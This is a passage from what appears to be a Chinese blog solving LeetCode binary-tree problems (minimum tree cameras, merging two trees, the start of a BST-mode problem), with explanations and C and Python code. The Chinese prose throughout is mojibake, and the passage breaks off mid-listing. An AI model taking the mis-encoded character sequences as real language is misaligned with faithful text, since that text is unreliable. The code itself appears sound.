‘çš„èŠ‚ç‚¹ä¸Šå®‰è£…æ‘„åƒå¤´ã€‚</p><p>èŠ‚ç‚¹ä¸Šçš„æ¯ä¸ªæ‘„å½±å¤´éƒ½å¯ä»¥ç›‘è§†å…¶çˆ¶å¯¹è±¡ã€è‡ªèº«åŠå…¶ç›´æ¥å­å¯¹è±¡ã€‚</p><p>è®¡ç®—ç›‘æ§æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹æ‰€éœ€çš„æœ€å°æ‘„åƒå¤´æ•°é‡ã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_01.png" alt="image.png"></p><p>è¾“å…¥ï¼š[0,0,null,0,0]<br>è¾“å‡ºï¼š1<br>è§£é‡Šï¼šå¦‚å›¾æ‰€ç¤ºï¼Œä¸€å°æ‘„åƒå¤´è¶³ä»¥ç›‘æ§æ‰€æœ‰èŠ‚ç‚¹ã€‚<br>ç¤ºä¾‹ 2ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_02.png" alt="image.png"></p><p>è¾“å…¥ï¼š[0,0,null,0,null,0,null,null,0]<br>è¾“å‡ºï¼š2<br>è§£é‡Šï¼šéœ€è¦è‡³å°‘ä¸¤ä¸ªæ‘„åƒå¤´æ¥ç›‘è§†æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚ ä¸Šå›¾æ˜¾ç¤ºäº†æ‘„åƒå¤´æ”¾ç½®çš„æœ‰æ•ˆä½ç½®ä¹‹ä¸€ã€‚</p><p>æç¤ºï¼š</p><p>ç»™å®šæ ‘çš„èŠ‚ç‚¹æ•°çš„èŒƒå›´æ˜¯ [1, 1000]ã€‚<br>æ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½æ˜¯ 0ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/binary-tree-cameras">https://leetcode-cn.com/problems/binary-tree-cameras</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p><del>åˆæ˜¯hardï¼ŒçœŸæœ‰ä½ çš„å•Šleetcode</del></p><p>ä»”ç»†æƒ³æƒ³ï¼Œå¯¹äºä¸€ä¸ªç»“ç‚¹æ˜¯å¦éœ€è¦å®‰è£…æ‘„åƒå¤´ï¼Œå…¶å®æ˜¯<strong>ç”±å…¶å­æ ‘çš„çŠ¶æ€æ¥å†³å®šçš„</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>åŠ¨æ€è§„åˆ’ç®—æ³•</strong></p><h4 id="è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰"><a href="#è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰" class="headerlink" title="è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ + åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰"></a>è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ + åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰</h4><p>å¤§æ¦‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://i.loli.net/2020/09/22/5v4sz9fdl2OLau7.png" alt="image.png"></p><p>æˆ‘ä»¬è€ƒè™‘æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</p><ul><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å·¦æˆ–å³å­æ ‘æ²¡æœ‰è¢«æ‘„åƒå¤´è¦†ç›–ä¸Šæ—¶ï¼Œè¿™ä¸ªç»“ç‚¹å¿…é¡»è¦å®‰è£…ä¸€ä¸ªæ‘„åƒå¤´æ¥ç›‘æµ‹å…¶å·¦æˆ–å³å­æ ‘ï¼Œå®šä¹‰ä¸ºçŠ¶æ€ç STATUS_CAMERA</strong></li><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å·¦å³å­æ ‘éƒ½å·²ç»è¢«æ‘„åƒå¤´è¦†ç›–ä¸Šæ—¶ï¼Œä¸ºäº†å®ç°æ‘„åƒå¤´æ•°é‡çš„æœ€å°åŒ–ï¼Œéœ€è¦åœ¨è¯¥ç»“ç‚¹çš„çˆ¶ç»“ç‚¹æ”¾ç½®æ‘„åƒå¤´ï¼Œå³åœ¨å›åˆ°çˆ¶ç»“ç‚¹å‰è¯¥ç»“ç‚¹éƒ½æ˜¯æœªè¢«è¦†ç›–çš„ï¼Œå®šä¹‰ä¸ºçŠ¶æ€ç STATUS_UNCOVERED</strong></li><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å·¦å³å­æ ‘ä¸­å­˜åœ¨æ‘„åƒå¤´ï¼Œåˆ™è¯¥ç»“ç‚¹è‚¯å®šæ˜¯è¢«è¦†ç›–äº†çš„ï¼Œå®šä¹‰ä¸ºçŠ¶æ€ç STATUS_COVERED</strong></li><li><strong>å¯¹äºç»“ç‚¹ä¸ºNULLçš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥é»˜è®¤ä»–æ˜¯è¢«è¦†ç›–äº†çš„ç»“ç‚¹ï¼Œå³å®šä¹‰ä¸ºçŠ¶æ€ç STATUS_COVERED</strong></li></ul><p>åŒæ—¶ï¼Œ<strong>æˆ‘ä»¬è¿˜éœ€è¦å¯¹è¿™æ£µæ ‘çš„æ ¹èŠ‚ç‚¹åšä¸€æ¬¡å•ç‹¬çš„æ£€æµ‹ï¼Œä»¥ç¡®å®šæ˜¯å¦è¦åœ¨å…¶ä¸Šæ”¾ç½®æ‘„åƒå¤´</strong></p><p>ä¸ºäº†æ–¹ä¾¿åˆ¤å®šï¼Œæˆ‘ä»¬å°†STATUS_CAMERAè®¾ç½®ä¸ºçŠ¶æ€ç ä¸­å€¼ç›¸å¯¹å¤§çš„ä¸€ä¸ª</p><h4 id="çŠ¶æ€è½¬ç§»æ–¹ç¨‹"><a href="#çŠ¶æ€è½¬ç§»æ–¹ç¨‹" class="headerlink" title="çŠ¶æ€è½¬ç§»æ–¹ç¨‹"></a>çŠ¶æ€è½¬ç§»æ–¹ç¨‹</h4><p><strong>STATUS_ROOT &#x3D; F(STATUS_LEFT, STATUS_RIGHT)</strong></p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>næ¬¡éå†ï¼Œçº¿æ€§æ—¶é—´å¤æ‚åº¦<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>é€’å½’ç®—æ³•è¦å¼€è¾Ÿnä¸ªæ ˆç©ºé—´ï¼Œæ•…ä¸ºçº¿æ€§ç©ºé—´å¤æ‚åº¦<strong>O</strong>(<strong>N</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><h4 id="Cè¯­è¨€ç‰ˆ"><a href="#Cè¯­è¨€ç‰ˆ" class="headerlink" title="Cè¯­è¨€ç‰ˆ"></a>Cè¯­è¨€ç‰ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * status code</span></span><br><span class="line"><span class="comment"> * 0: waiting for pwn</span></span><br><span class="line"><span class="comment"> * 1: has been pwn</span></span><br><span class="line"><span class="comment"> * 2: camara here</span></span><br><span class="line"><span class="comment"> *-1: inner error, just a placeholder in fact</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_UNCOVERED 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_COVERED 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_CAMERA 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ERROR -1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">minCameraCover</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> amounts=<span class="number">0</span>;<span class="comment">//amounts of camera</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//add a camera to the root if status of root is 0</span></span><br><span class="line">    <span class="keyword">if</span>(dfs(root,&amp;amounts) == STATUS_UNCOVERED)</span><br><span class="line">        amounts++;</span><br><span class="line">    <span class="keyword">return</span> amounts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> * amounts)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//NULL pointer signed as status 1</span></span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the status of left and right node</span></span><br><span class="line">    <span class="type">int</span> left = dfs(root-&gt;left, amounts);</span><br><span class="line">    <span class="type">int</span> right = dfs(root-&gt;right, amounts);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if one of both uncovered yet, a camera is needed</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_UNCOVERED || right == STATUS_UNCOVERED)</span><br><span class="line">    &#123;</span><br><span class="line">        (*amounts)++;</span><br><span class="line">        <span class="keyword">return</span> STATUS_CAMERA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if both are covered, father&#x27;s of root may need a camera</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_COVERED &amp;&amp; right == STATUS_COVERED)</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNCOVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if there&#x27;s at least one camera in both childs, the root is covered</span></span><br><span class="line">    <span class="keyword">if</span>(left + right &gt; STATUS_CAMERA)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//error code(not used)</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/64ytrK3gLNGowbf.png" alt="EE8895_CCLKZDA_OPW4_FT1.png"></p><h4 id="Pythonè¯­è¨€ç‰ˆï¼š"><a href="#Pythonè¯­è¨€ç‰ˆï¼š" class="headerlink" title="Pythonè¯­è¨€ç‰ˆï¼š"></a>Pythonè¯­è¨€ç‰ˆï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  status</span></span><br><span class="line"><span class="comment">#  0 - waiting for pwn</span></span><br><span class="line"><span class="comment">#  1 - has been pwn</span></span><br><span class="line"><span class="comment">#  2 - camera here</span></span><br><span class="line"><span class="comment"># -1 - error, just a placeholder</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    amounts = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">self, root: TreeNode</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        left = self.dfs(root.left)</span><br><span class="line">        right = self.dfs(root.right)</span><br><span class="line">        <span class="keyword">if</span> left == <span class="number">1</span> <span class="keyword">and</span> right == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> left == <span class="number">0</span> <span class="keyword">or</span> right == <span class="number">0</span>:</span><br><span class="line">            self.amounts += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> left + right &gt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minCameraCover</span>(<span class="params">self, root: TreeNode</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> self.dfs(root) == <span class="number">0</span>:</span><br><span class="line">            self.amounts += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self.amounts</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/2tbv6R7LizECw3e.png" alt="image.png"></p><h3 id="23-617-åˆå¹¶äºŒå‰æ ‘ï¼ˆç®€å•ï¼‰"><a href="#23-617-åˆå¹¶äºŒå‰æ ‘ï¼ˆç®€å•ï¼‰" class="headerlink" title="23 - 617. åˆå¹¶äºŒå‰æ ‘ï¼ˆç®€å•ï¼‰"></a>23 - <a href="https://leetcode-cn.com/problems/merge-two-binary-trees/">617. åˆå¹¶äºŒå‰æ ‘ï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>ç»™å®šä¸¤ä¸ªäºŒå‰æ ‘ï¼Œæƒ³è±¡å½“ä½ å°†å®ƒä»¬ä¸­çš„ä¸€ä¸ªè¦†ç›–åˆ°å¦ä¸€ä¸ªä¸Šæ—¶ï¼Œä¸¤ä¸ªäºŒå‰æ ‘çš„ä¸€äº›èŠ‚ç‚¹ä¾¿ä¼šé‡å ã€‚</p><p>ä½ éœ€è¦å°†ä»–ä»¬åˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„äºŒå‰æ ‘ã€‚åˆå¹¶çš„è§„åˆ™æ˜¯å¦‚æœä¸¤ä¸ªèŠ‚ç‚¹é‡å ï¼Œé‚£ä¹ˆå°†ä»–ä»¬çš„å€¼ç›¸åŠ ä½œä¸ºèŠ‚ç‚¹åˆå¹¶åçš„æ–°å€¼ï¼Œå¦åˆ™ä¸ä¸º NULL çš„èŠ‚ç‚¹å°†ç›´æ¥ä½œä¸ºæ–°äºŒå‰æ ‘çš„èŠ‚ç‚¹ã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥:<br>    Tree 1                     Tree 2<br>          1                         2<br>         &#x2F; \                       &#x2F; \<br>        3   2                     1   3<br>       &#x2F;                             \   \<br>      5                             4   7<br>è¾“å‡º:<br>åˆå¹¶åçš„æ ‘:<br>         3<br>        &#x2F; \<br>       4   5<br>      &#x2F; \   \<br>     5   4   7<br>æ³¨æ„: åˆå¹¶å¿…é¡»ä»ä¸¤ä¸ªæ ‘çš„æ ¹èŠ‚ç‚¹å¼€å§‹ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/merge-two-binary-trees">https://leetcode-cn.com/problems/merge-two-binary-trees</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>å¾ˆç®€å•çš„ä¸€é“é¢˜ï¼Œ<del>3åˆ†é’Ÿä¸åˆ°å°±åšå‡ºæ¥äº†ï¼Œä»Šæ™šå¯ä»¥åšä¸ªå¥½æ¢¦äº†</del>ï¼ˆ<del>ç¡®ä¿¡</del></p><h4 id="è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"><a href="#è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰" class="headerlink" title="è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h4><p>é€å±‚é€’å½’ï¼Œåˆå¹¶åˆ°t1ä¸Šï¼š</p><ul><li><strong>t1ã€t2è‹¥ä¸ºç©ºåˆ™ç›´æ¥è¿”å›å…¶ä¸­éç©ºçš„é‚£ä¸€ä¸ª</strong></li><li><strong>å°†t2çš„valåŠ åˆ°t1çš„valä¸Š</strong></li><li><strong>åˆå¹¶t1å·¦ä¸t2å·¦</strong></li><li><strong>åˆå¹¶t1å³ä¸t2å³</strong></li></ul><p>å¾—åˆ°ä»£ç å¦‚ä¸‹ï¼š</p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-1"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-1" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>æœç´¢çš„æ¬¡æ•°å’Œç»“ç‚¹æ•°é‡çº¿æ€§å¢é•¿ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-1"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-1" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>éœ€è¦çš„æ ˆç©ºé—´æ•°é‡å’Œç»“ç‚¹æ•°é‡çº¿æ€§å¢é•¿ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><h4 id="Cè¯­è¨€ç‰ˆï¼š"><a href="#Cè¯­è¨€ç‰ˆï¼š" class="headerlink" title="Cè¯­è¨€ç‰ˆï¼š"></a>Cè¯­è¨€ç‰ˆï¼š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">mergeTrees</span><span class="params">(<span class="keyword">struct</span> TreeNode* t1, <span class="keyword">struct</span> TreeNode* t2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!t1)</span><br><span class="line">        <span class="keyword">return</span> t2;</span><br><span class="line">    <span class="keyword">if</span>(!t2)</span><br><span class="line">        <span class="keyword">return</span> t1;</span><br><span class="line">    t1-&gt;val += t2-&gt;val;</span><br><span class="line">    t1-&gt;left = mergeTrees(t1-&gt;left,t2-&gt;left);</span><br><span class="line">    t1-&gt;right = mergeTrees(t1-&gt;right,t2-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> t1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXgivj.png" alt="wXgivj.png"></p><h4 id="Pythonè¯­è¨€ç‰ˆï¼š-1"><a href="#Pythonè¯­è¨€ç‰ˆï¼š-1" class="headerlink" title="Pythonè¯­è¨€ç‰ˆï¼š"></a>Pythonè¯­è¨€ç‰ˆï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mergeTrees</span>(<span class="params">self, t1: TreeNode, t2: TreeNode</span>) -&gt; TreeNode:</span><br><span class="line">        <span class="keyword">if</span> t1 == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> t2</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> t1</span><br><span class="line">        t1.val += t2.val</span><br><span class="line">        t1.left = self.mergeTrees(t1.left, t2.left)</span><br><span class="line">        t1.right = self.mergeTrees(t1.right, t2.right)</span><br><span class="line">        <span class="keyword">return</span> t1</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXgJVx.png" alt="wXgJVx.png"></p><h3 id="24-501-äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°ï¼ˆç®€å•ï¼‰"><a href="#24-501-äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°ï¼ˆç®€å•ï¼‰" class="headerlink" title="24 - 501. äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°ï¼ˆç®€å•ï¼‰"></a>24 - <a href="https://leetcode-cn.com/problems/find-mode-in-binary-search-tree/">501. äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°ï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªæœ‰ç›¸åŒå€¼çš„äºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰ï¼Œæ‰¾å‡º BST ä¸­çš„æ‰€æœ‰ä¼—æ•°ï¼ˆå‡ºç°é¢‘ç‡æœ€é«˜çš„å…ƒç´ ï¼‰ã€‚</p><p>å‡å®š BST æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><p>ç»“ç‚¹å·¦å­æ ‘ä¸­æ‰€å«ç»“ç‚¹çš„å€¼å°äºç­‰äºå½“å‰ç»“ç‚¹çš„å€¼<br>ç»“ç‚¹å³å­æ ‘ä¸­æ‰€å«ç»“ç‚¹çš„å€¼å¤§äºç­‰äºå½“å‰ç»“ç‚¹çš„å€¼<br>å·¦å­æ ‘å’Œå³å­æ ‘éƒ½æ˜¯äºŒå‰æœç´¢æ ‘<br>ä¾‹å¦‚ï¼š<br>ç»™å®š BST [1,null,2,2],</p><p>   1<br>    \<br>     2<br>    &#x2F;<br>   2<br>è¿”å›[2].</p><p>æç¤ºï¼šå¦‚æœä¼—æ•°è¶…è¿‡1ä¸ªï¼Œä¸éœ€è€ƒè™‘è¾“å‡ºé¡ºåº</p><p>è¿›é˜¶ï¼šä½ å¯ä»¥ä¸ä½¿ç”¨é¢å¤–çš„ç©ºé—´å—ï¼Ÿï¼ˆå‡è®¾ç”±é€’å½’äº§ç”Ÿçš„éšå¼è°ƒç”¨æ ˆçš„å¼€é”€ä¸è¢«è®¡ç®—åœ¨å†…ï¼‰</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/find-mode-in-binary-search-tree">https://leetcode-cn.com/problems/find-mode-in-binary-search-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h4 id="è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-1"><a href="#è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-1" class="headerlink" title="è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h4><p>è€ƒè™‘åˆ°äºŒå‰æœç´¢æ ‘ä¸­<strong>å·¦å­æ ‘æ‰€æœ‰ç»“ç‚¹çš„å€¼å°äºå½“å‰ç»“ç‚¹å€¼å°äºå³å­æ ‘æ‰€æœ‰ç»“ç‚¹çš„å€¼</strong>ï¼Œæ•…è¿˜æ˜¯é‡‡å–<strong>æ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³•</strong></p><p>é€’å½’ä¸­åºéå†ï¼Œç”±äºäºŒå‰æœç´¢æ ‘çš„ç‰¹æ®Šæ€§è´¨ï¼Œæˆ‘ä»¬éå†çš„é¡ºåºä¸€å®šæ˜¯<strong>æ’åºå¥½çš„</strong></p><p>æ•…æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 